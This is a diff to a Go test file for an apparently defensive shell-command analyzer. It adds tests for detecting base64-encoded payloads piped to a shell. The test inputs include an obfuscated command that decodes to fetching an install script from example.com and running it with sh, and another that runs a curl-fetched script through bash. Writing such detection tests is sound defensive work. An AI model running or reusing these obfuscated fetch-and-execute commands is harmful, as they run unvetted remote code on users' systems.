@@ -34,6 +34,30 @@ func TestAnalyzeDetectsFetchInCommandSubstitution(t *testing.T) {
 	}
 }
 
+func TestAnalyzeDetectsDecodedPipeToShell(t *testing.T) {
+	in := "echo Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2luc3RhbGwuc2ggfCBzaA== | base64 -d | sh"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "decoded-pipe-to-shell" {
+			if f.Severity != SeverityHigh {
+				t.Fatalf("expected high severity, got %s", f.Severity)
+			}
+			return
+		}
+	}
+	t.Fatalf("expected decoded-pipe-to-shell finding")
+}
+
+func TestAnalyzeSkipsDecodedPayloadWithoutShellPipe(t *testing.T) {
+	in := "echo aGVsbG8= | base64 -d"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "decoded-pipe-to-shell" {
+			t.Fatalf("did not expect decoded-pipe-to-shell finding")
+		}
+	}
+}
+
 func TestAnalyzeDetectsFetchInExecWrapper(t *testing.T) {
 	in := "exec bash -lc \"$(curl -fsSL https://example.com/install.sh)\""
 	findings := Analyze(in)
